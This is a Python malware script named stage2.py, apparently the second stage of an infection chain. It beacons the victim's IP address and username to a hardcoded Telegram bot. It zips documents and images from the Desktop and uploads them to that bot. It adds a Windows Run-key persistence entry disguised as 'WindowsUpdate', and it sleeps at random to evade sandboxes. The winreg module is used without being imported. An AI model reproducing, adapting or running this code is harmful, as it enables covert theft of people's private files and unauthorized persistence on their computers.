# stage2.py
import os
import shutil
import getpass
import requests
import subprocess
import time
import sys
import hashlib

# --- CONFIG ---
TELEGRAM_TOKEN = "8268540452:AAEQl6dAmNxWTrfVEOy4liqMoxt2qm1-_hs"
CHAT_ID = "3032183658"

def send_telegram(msg):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    try:
        requests.post(url, data={"chat_id": CHAT_ID, "text": msg}, timeout=10)
    except:
        pass

def send_document(file_path):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
    try:
        with open(file_path, "rb") as f:
            requests.post(url, data={"chat_id": CHAT_ID}, files={"document": f})
    except:
        pass

# --- EXFIL: Steal Desktop Files ---
def exfil_files():
    user = getpass.getuser()
    if os.name == 'nt':
        desktop = f"C:\\Users\\{user}\\Desktop"
    else:
        desktop = f"/home/{user}/Desktop"

    if not os.path.exists(desktop):
        return

    # Find sensitive files
    files = []
    for f in os.listdir(desktop):
        path = os.path.join(desktop, f)
        if os.path.isfile(path):
            if f.lower().endswith(('.pdf', '.docx', '.xlsx', '.txt', '.jpg')) and os.path.getsize(path) < 5_000_000:
                files.append(path)

    if not files:
        return

    # Zip them
    try:
        shutil.make_archive("exfil", 'zip', root_dir=None, base_dir=files)
        send_document("exfil.zip")
        os.remove("exfil.zip")
        send_telegram("✅ Exfil: Sent desktop files")
    except Exception as e:
        send_telegram(f"❌ Exfil failed: {str(e)}")

# --- PERSISTENCE: Add to Run Key (Windows) ---
def add_persistence():
    if os.name != 'nt':
        return
    try:
        # Avoid duplicate entries
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_READ)
        try:
            val, _ = winreg.QueryValueEx(key, "WindowsUpdate")
            if val:
                return  # Already exists
        except:
            pass
        finally:
            winreg.CloseKey(key)

        # Add persistence
        reg_cmd = (
            'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
            '/v "WindowsUpdate" '
            f'/t REG_SZ /d "python \\"{sys.argv[0]}\\"" /f'
        )
        subprocess.Popen(reg_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        send_telegram("✅ Persistence added")
    except Exception as e:
        send_telegram(f"❌ Persistence failed: {str(e)}")

# --- MAIN EXECUTION ---
if __name__ == "__main__":
    # Avoid sandbox: sleep 30–90 sec
    time.sleep(30 + (hash(str(os.environ)) % 60))

    # Send beacon
    try:
        ip = requests.get("https://api.ipify.org", timeout=5).text
    except:
        ip = "Unknown"

    send_telegram(f"🟢 stage2.py executed | IP: {ip} | Host: {os.getlogin()}")

    # Run tasks
    try:
        exfil_files()
    except Exception as e:
        send_telegram(f"❌ exfil_files error: {str(e)}")

    try:
        add_persistence()
    except Exception as e:
        send_telegram(f"❌ add_persistence error: {str(e)}")
